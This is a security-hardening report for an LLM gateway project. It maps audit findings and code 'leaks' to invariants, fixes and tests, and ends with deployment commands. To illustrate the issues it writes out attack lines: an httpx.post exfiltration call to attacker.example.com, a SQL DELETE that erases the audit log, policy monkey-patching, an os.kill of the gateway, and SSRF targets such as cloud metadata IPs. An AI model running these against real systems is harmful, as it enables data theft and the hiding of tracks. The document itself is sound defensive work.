# Session 12 Part 1 — Findings, Invariants, Fixes

**Submission:** [`harden/session12-part1`](https://github.com/Shwethaamrutha/glc_v2/tree/harden/session12-part1) · 12 commits · 310 tests pass · ruff clean · deployed on Modal.

Every finding from Section 6 (groups A + C) and Section 7 (10 leaks) is mapped below to its Section 4 invariant, the fix applied, and the test that verifies it.

---

## Contents

- [The 8 invariants](#the-8-invariants)
- [Fix summary](#fix-summary)
- [Findings table](#findings-table)
- [Per-finding detail](#per-finding-detail)
- [Deploying](#deploying)

---

## The 8 invariants

| # | Rule | Prevents |
|---|------|----------|
| 1 | Adapters must never see provider API keys | Key theft by a compromised adapter |
| 2 | Every action checked against the actual user, tenant, and final args | Acting for the wrong principal |
| 3 | External content is always data, never instructions | Prompt injection through content |
| 4 | A credential works for only one tool call | Token reuse across tools/actions |
| 5 | Each tenant has separate memory; every fact records its source | Cross-tenant memory bleed |
| 6 | Dangerous actions approved with their final params | Approve-then-swap (TOCTOU) |
| 7 | Components can't edit or delete their audit logs | Hiding tracks |
| 8 | Hard limits on time, tokens, tool calls, cost | Runaway cost / DoS |

---

## Fix summary

| Move | Where |
|---|---|
| Provider-key isolation — gateway holds no keys; per-provider worker + Secret + egress allowlist | `glc/provider_worker.py`, `glc/provider_broker.py`, `infra/modal_workers.py` |
| Adapter isolation — 15 adapters, each in its own container + Secret + egress | `glc/adapter_worker.py`, `glc/adapter_broker.py`, `infra/modal_adapters.py` |
| Data-plane auth — bearer key, fails closed, docs disabled | `glc/security/auth.py`, `glc/main.py` |
| Egress control — SSRF-safe fetch + per-host allowlist | `glc/security/egress.py` |
| Audit hash chain — SHA-256 chain + verify endpoint | `glc/audit/store.py` |
| Signed cost ledger — HMAC per row + verify endpoint | `glc/db.py` |
| Rate limits + daily budget + pairing throttle | `glc/security/budget.py`, `glc/security/pairing.py` |
| Reproducible deploy — image from `uv.lock`, single audit writer | `infra/modal_app.py` |

---

## Findings table

### Section 6 · Group A

| # | Finding | Inv. | Fix | Test |
|---|---------|------|-----|------|
| A1 | Public data plane, no auth | 2, 8 | Bearer-key auth on every data-plane route, fails closed | `test_data_plane_auth.py` + live 401/403/200 |
| A2 | Info disclosure + Swagger open | 2 | Read routes gated; docs disabled unless `GLC_ENABLE_DOCS=1` | live `/openapi.json` → 404 |
| A3 | Single Function, no egress wall | 1, 3 | Per-worker egress allowlist (see leak 6) | `test_egress.py` |
| A4 | One shared Secret for all keys | 1 | Per-provider Secrets; keyless gateway (see leak 1) | `test_provider_isolation.py` + live Gemini/NVIDIA |
| A5 | Non-reproducible image | supply-chain | Install from frozen `uv.lock`, pinned base | build reproduces |
| A6 | Audit DB corrupt under autoscale | 7 | `max_containers=1`; DBs honor `GLC_CONFIG_DIR` | `test_audit_chain.py` |

### Section 6 · Group C

| # | Finding | Inv. | Fix | Test |
|---|---------|------|-----|------|
| C1 | SSRF via `/v1/vision` | 2 | Per-hop private/link-local denylist on redirects | `test_egress.py` + live 400 on metadata IPs |
| C2 | Cross-channel envelope spoofing | 2 | See leak 9 | `test_channel_ws_security.py` |
| C3 | WS token in query string | 4 | Header-only, constant-time compare | `test_channel_ws_security.py` |
| C4 | Verbose upstream errors | info-disclosure | Generic client message; detail in server logs | live generic error |
| C5 | No rate limits or budget on data plane | 8 | Per-caller RPM + daily budget | `test_dataplane_budget.py` |
| C6 | Pairing-code brute force | 2 | 5-strike lockout | `test_pairing_bruteforce.py` |

### Section 7 — the ten code leaks

| # | Leak | Inv. | Fix | Test |
|---|------|------|-----|------|
| 1 | Shared process env holds all keys | 1 | Per-provider worker; gateway holds zero keys | `test_provider_isolation.py` + live Gemini/NVIDIA |
| 2 | Audit DB writable at OS layer | 7 | SHA-256 hash chain + `verify_chain()` + `/v1/control/audit/verify` | `test_audit_chain.py` |
| 3 | `force_pair_owner()` in-process | 2 | Bootstrap-only flag + container split | `test_force_pair_guard.py` |
| 4 | Install token readable in-process | 2, 4 | Delivered via Secret, never written to shared Volume | `test_install_token_secret.py` |
| 5 | Policy engine monkey-patch | 6 | Container/process separation (structural) | — |
| 6 | Unbounded network egress | 1, 3 | Per-worker egress allowlist | `test_egress.py` |
| 7 | Subprocess/shell capability | 8 / RCE | Per-component images + gVisor + `restrict_modal_access` | deploy config |
| 8 | Adapter kills gateway (`os.kill`) | 8 | PID-namespace split via container isolation | — |
| 9 | Cross-channel envelope spoof | 2 | `env.channel == route` check; reject + audit + close | `test_channel_ws_security.py` |
| 10 | Cost-ledger poisoning | 7, 8 | Input validation + HMAC signed writer + `/v1/control/ledger/verify` | `test_cost_ledger.py` |

---

## Per-finding detail

<details><summary><strong>A1 — Public data plane, no auth</strong> · invariant 2, 8</summary>

- **Issue:** `/v1/chat`, `/chat/batch`, `/embed`, `/vision`, `/speak`, `/transcribe` ran for anyone; unauth `/v1/chat` returned 502 (provider error), not 401.
- **Fix:** `require_api_key` dependency on every data-plane router. Bearer `GLC_GATEWAY_API_KEY`, constant-time compare, fails closed (503) if no key is configured. `/healthz` stays open. (`glc/security/auth.py`, `glc/main.py`)
- **Test:** `test_data_plane_auth.py` (no-key 401, wrong-key 403, docs disabled, `/healthz` open, fail-closed on unset key). Live: unauth 401, wrong-key 403, with valid key 502 (reaches provider).

</details>

<details><summary><strong>A2 — Info disclosure + Swagger open</strong> · invariant 2</summary>

- **Issue:** `/v1/status`, `/providers`, `/capabilities`, `/cost/by_agent`, `/calls`, `/docs`, `/openapi.json` all open.
- **Fix:** read routes sit behind the same auth gate; `/docs`, `/redoc`, `/openapi.json` disabled unless `GLC_ENABLE_DOCS=1`.
- **Test:** live `/v1/providers` → 401, `/openapi.json` and `/docs` → 404.

</details>

<details><summary><strong>A3 — Single Function, no egress wall</strong> · invariant 1, 3</summary>

Same fix as leak 6: each provider worker Function has its own `GLC_EGRESS_ALLOWLIST`; `glc/security/egress.py` is the app-layer companion that blocks off-allowlist and private/link-local targets.

</details>

<details><summary><strong>A4 — One Secret for all provider keys</strong> · invariant 1</summary>

Same fix as leak 1: gateway runs with `GLC_ISOLATED_PROVIDERS=1` and reads no provider key. Each key is a separate per-provider Secret mounted only into that provider's worker.

</details>

<details><summary><strong>A5 — Non-reproducible image</strong> · supply-chain</summary>

- **Issue:** shipped `modal_app.py` on rolling `debian_slim` with `>=` deps, ignored `uv.lock`.
- **Fix:** `infra/modal_app.py` installs from the frozen `uv.lock` (`uv export --frozen`). Provider workers use a minimal pinned image.
- **Test:** build reproduces from the lockfile.

</details>

<details><summary><strong>A6 — Audit DB corrupt under autoscale + latent persistence bug</strong> · invariant 7</summary>

- **Issue:** `min_containers=0` + autoscale → multiple containers → concurrent SQLite writers → split/corrupt audit trail. Compounding bug: the audit, pairing, and ledger stores defaulted to `~/.glc/` and ignored `GLC_CONFIG_DIR`, so on Modal these DBs would land on the throwaway container filesystem and vanish on restart.
- **Fix:**
  - `infra/modal_app.py` sets `max_containers=1` (single audit writer).
  - Audit store commits each append (`isolation_level=None`).
  - `glc/audit/store.py`, `glc/db.py`, `glc/security/pairing.py` now honor `GLC_CONFIG_DIR` at call time.
- **Test:** `test_audit_chain.py`.

</details>

<details><summary><strong>C1 — SSRF via <code>/v1/vision</code></strong> · invariant 2</summary>

- **Issue:** `_resolve_image_urls` fetched any http(s) URL with `follow_redirects=True`, no allowlist.
- **Fix:** `glc/security/egress.safe_get` follows redirects manually and re-validates every hop against the private/loopback/link-local/reserved denylist (IPv4, IPv6, IPv4-mapped IPv6).
- **Test:** `test_egress.py`. Live: vision at `169.254.169.254`, `127.0.0.1`, `10.0.0.1`, `fd00::1`, `metadata.google.internal` → 400 rejected.

</details>

<details><summary><strong>C2 — Cross-channel envelope spoofing</strong> · invariant 2</summary>

Same as leak 9.

</details>

<details><summary><strong>C3 — WS install token in query string</strong> · invariant 4</summary>

- **Issue:** `WS /v1/channels/{name}?token=...` accepted the install token in the query string — lands in access logs.
- **Fix:** header-only (`Authorization: Bearer`), constant-time compare. `?token=` path removed.
- **Test:** `test_channel_ws_security.py::test_ws_rejects_query_string_token`.

</details>

<details><summary><strong>C4 — Verbose upstream errors</strong> · info disclosure</summary>

- **Issue:** `/v1/chat` returned the raw provider error and endpoint.
- **Fix:** client sees a generic message; provider/endpoint/raw error stay in the server-side `db.log_call` ledger.
- **Test:** live mock-key request returns `{"detail":"upstream provider error; see gateway logs for detail"}`.

</details>

<details><summary><strong>C5 — No rate limits or budget on public data plane</strong> · invariant 8</summary>

- **Fix:** `glc/security/budget.py` adds per-caller sliding-60s rate limit (`GLC_DATAPLANE_RPM`, default 60) and hard daily request budget (`GLC_DATAPLANE_DAILY_BUDGET`, default 5000), wired as a data-plane dependency.
- **Test:** `test_dataplane_budget.py`.

</details>

<details><summary><strong>C6 — Pairing-code brute force</strong> · invariant 2</summary>

- **Fix:** `PairingStore.confirm_code` throttles failed attempts (5 per 5-min window, then lockout). Control route returns 429 when throttled.
- **Test:** `test_pairing_bruteforce.py`.

</details>

---

<details><summary><strong>Leak 1 — Shared process environment holds all keys</strong> · invariant 1</summary>

- **Issue:** every adapter runs in the gateway process; `os.environ["GEMINI_API_KEY"]` (and every other key) readable in-process.
- **Fix:** the gateway holds no provider keys. In isolated mode (`GLC_ISOLATED_PROVIDERS=1`) it builds keyless `RemoteProvider` objects that dispatch each call to an isolated worker holding exactly one provider's key — a subprocess locally, a per-provider Modal Function with its own Secret in prod.
- **Test:** `test_provider_isolation.py`. Live: `/v1/chat` on the hardened gateway → auth clears → isolated `chat_gemini` worker → real Gemini API completion; gateway process env has no `GEMINI_API_KEY`. Same path verified with a real NVIDIA key on `chat_nvidia`.

</details>

<details><summary><strong>Leak 2 — Audit DB writable at OS layer</strong> · invariant 7</summary>

- **Issue:** `sqlite3.connect(...).execute("DELETE FROM audit_log")` silently erases history.
- **Fix:** SHA-256 hash chain on `audit_log` (`prev_hash`, `row_hash`; schema v2). Any DELETE/UPDATE/splice breaks the chain, and `verify_chain()` reports the first broken row. Exposed at `GET /v1/control/audit/verify` (install-token gated).
- **Test:** `test_audit_chain.py` — delete and edit both detected.

</details>

<details><summary><strong>Leak 3 — <code>force_pair_owner()</code> reachable in-process</strong> · invariant 2</summary>

- **Issue:** one line grants the caller `owner_paired` trust.
- **Fix:** `force_pair_owner()` refuses to run unless `GLC_ALLOW_FORCE_PAIR=1`. The one-shot installer sets it; the serving gateway never does. Structural close is the container split.
- **Test:** `test_force_pair_guard.py`.

</details>

<details><summary><strong>Leak 4 — Install token readable in-process</strong> · invariant 2, 4</summary>

- **Issue:** `~/.glc/install_token` at mode 0600 keeps out other Unix users but not same-user code.
- **Fix:** token delivered via `GLC_INSTALL_TOKEN` (a Secret mounted only into the gateway); in that mode, never written to the shared config Volume.
- **Test:** `test_install_token_secret.py`.

</details>

<details><summary><strong>Leak 5 — Policy engine open to monkey-patching</strong> · invariant 6</summary>

- **Issue:** `glc.policy.engine.evaluate = lambda ...` rebinds the policy check.
- **Fix:** closed by container/process separation. In-process Python can rebind a module attribute, so an in-process guard is not truthful. The policy engine has no live runtime call site yet (S11 agent is a stub).

</details>

<details><summary><strong>Leak 6 — Unbounded network egress</strong> · invariant 1, 3</summary>

- **Issue:** `httpx.post("https://attacker.example.com/exfil", ...)` and the bytes leave; a single Function has no outbound control.
- **Fix:** per-provider workers run with their own egress allowlist (`GLC_EGRESS_ALLOWLIST` = that provider's host only). `glc/security/egress.assert_egress_allowed` blocks off-allowlist and private/link-local hosts.
- **Test:** `test_egress.py`.

</details>

<details><summary><strong>Leak 7 — Unrestricted subprocess/shell capability</strong> · invariant 8 / RCE</summary>

- **Issue:** every `subprocess.run` in the codebase passes an argument list (no `shell=True`, no `os.system`), so there is no injection bug — but the monolithic image ships a shell, and any adapter can use it.
- **Fix:** per-component minimal images + gVisor sandbox (Modal `serialized=True` Functions run under gVisor — non-root, isolated PID/mount namespaces, syscall shield) + per-Function egress allowlists + `restrict_modal_access=True` on every provider worker and adapter Function.
- **Test:** deploy configuration on `infra/modal_workers.py` and `infra/modal_adapters.py`.

</details>

<details><summary><strong>Leak 8 — Adapter kills the gateway (<code>os.kill</code>)</strong> · invariant 8</summary>

- **Issue:** `os.kill(os.getpid(), SIGTERM)` ends the process. The remote kill endpoint is loopback-gated; the in-process path is only closed by PID-namespace separation.
- **Fix:** container split — adapters run in their own containers with their own PID namespace.

</details>

<details><summary><strong>Leak 9 — Cross-channel envelope spoofing</strong> · invariant 2</summary>

- **Issue:** WS `/v1/channels/{name}` never checked `env.channel == name`. A Telegram adapter could send `env.channel="discord"` and impersonate Discord.
- **Fix:** the WS route rejects any envelope whose `env.channel` differs from the route name, records a `channel_spoof_rejected` audit event, and closes the socket.
- **Test:** `test_channel_ws_security.py::test_ws_rejects_channel_mismatch`.

</details>

<details><summary><strong>Leak 10 — Cost-ledger poisoning</strong> · invariant 7, 8</summary>

- **Issue:** `db.log_call(... input_tokens=999_999_999 ...)` validated nothing.
- **Fix:** two layers.
  1. Input validation — `log_call` rejects non-int, negative, and absurd (>10M) token counts (`LedgerValidationError`) at the app-layer entry point.
  2. Signed writer — each row carries an HMAC-SHA256 over its signed fields, keyed by `GLC_LEDGER_SIGNING_KEY`. A row forged or edited via raw SQLite fails signature verification. Exposed at `GET /v1/control/ledger/verify`. `sig` column added with a defensive `ALTER TABLE` migration.
- **Test:** `test_cost_ledger.py` — validation rejects the documented poison; signature detects a raw-SQL `UPDATE` and a fully forged `INSERT`.

</details>

---

## Adapter isolation — all 15 verified

Each `adapter_<name>` Function on Modal was invoked directly with a valid `ChannelReply`. Every one ran its own `send()` code inside its own container.

| Adapter | Live outcome |
|---|---|
| gmail | Reached `_get_client()` / `token.json` |
| telegram | Reached `api.telegram.org` with its own token → 404 |
| discord | Ran transport check |
| slack | Executed send; returned mock channel/text |
| whatsapp | Ran pairing check |
| twilio_sms | Reached Twilio API |
| twilio_voice | Produced TwiML response |
| line | Ran transport check |
| teams | Ran context-cache check |
| matrix | Produced matrix send payload |
| signal | Produced signal-cli JSON-RPC payload |
| imap | Reached SMTP layer |
| webhook | Reached HTTP destination |
| webui | Produced ack payload |
| local_mic | Reached TTS router |

Unit tests (`test_adapter_isolation.py`) assert: (a) the Gmail adapter module is not imported into the gateway process in isolated mode, (b) the per-adapter secret reader never returns a sibling adapter's token, (c) every catalogue adapter has an isolation config, (d) each adapter's egress allowlist is channel-specific.

---

## Deploying

```bash
# per-provider key Secrets (mock values)
modal secret create glc-key-gemini      GEMINI_API_KEY=mock-not-real
modal secret create glc-key-groq        GROQ_API_KEY=mock-not-real
modal secret create glc-key-nvidia      NVIDIA_API_KEY=mock-not-real
modal secret create glc-key-cerebras    CEREBRAS_API_KEY=mock-not-real
modal secret create glc-key-openrouter  OPEN_ROUTER_API_KEY=mock-not-real
modal secret create glc-key-github      GITHUB_ACCESS_TOKEN=mock-not-real

# gateway auth key (no provider keys on the gateway)
modal secret create glc-gateway-auth    GLC_GATEWAY_API_KEY=<long-random>

# per-adapter channel secrets (all 15, mock values)
uv run python scripts/create_adapter_secrets.py --run

# deploy
modal deploy infra/modal_workers.py    # per-provider isolated workers
modal deploy infra/modal_adapters.py   # per-adapter isolated Sandboxes (all 15)
modal deploy infra/modal_app.py        # keyless gateway
```

Run the gateway with isolated adapters:

```bash
GLC_ISOLATED_ADAPTERS=1 GLC_ADAPTER_BACKEND=modal
```

Or locally with subprocess adapters and a per-adapter secret dir:

```bash
GLC_ADAPTER_SECRETS_DIR=/path/to/adapter-secrets \
GLC_ISOLATED_ADAPTERS=1 \
GLC_ADAPTER_BACKEND=subprocess
```

Provider workers (local subprocess mode):

```bash
GLC_ISOLATED_PROVIDERS=1 \
GLC_PROVIDER_BACKEND=subprocess \
GLC_PROVIDER_KEYS_DIR=/path/to/keys \
GLC_REQUIRE_AUTH=1 \
GLC_GATEWAY_API_KEY=... \
uv run uvicorn glc.main:app
```
